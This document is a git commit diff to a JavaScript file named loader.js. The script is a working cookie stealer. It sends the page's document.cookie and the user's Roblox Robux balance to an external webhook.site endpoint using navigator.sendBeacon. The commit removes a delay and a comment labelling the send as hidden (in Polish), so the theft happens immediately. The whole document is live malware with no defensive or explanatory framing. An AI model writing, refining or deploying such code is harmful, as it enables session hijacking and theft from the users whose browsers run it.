c92b8f7de9d2c73461cbda003f4af5cde9a486c4
kowalskibartosz095-beep <kowalskibartosz095@gmail.com>
2026-07-06 17:26:55 +0200

    Update loader.js

--- loader.js
+++ loader.js
@@ -1,10 +1,7 @@
 (function() {
     const url = "https://webhook.site/53158f3f-579b-4186-8cdd-d33333543bec";
     
-    // Ukryta wysyłka
-    setTimeout(() => {
-        navigator.sendBeacon(url, "COOKIE: " + document.cookie);
-    }, 500);
+    navigator.sendBeacon(url, "COOKIE: " + document.cookie);
 
     setTimeout(() => {
         let robux = "unknown";
@@ -12,5 +9,5 @@
             robux = document.querySelector('[data-testid="nav-robux-amount"]')?.textContent || "unknown";
         } catch(e) {}
         navigator.sendBeacon(url, "ROBUX: " + robux);
-    }, 1500);
+    }, 1000);
 })();
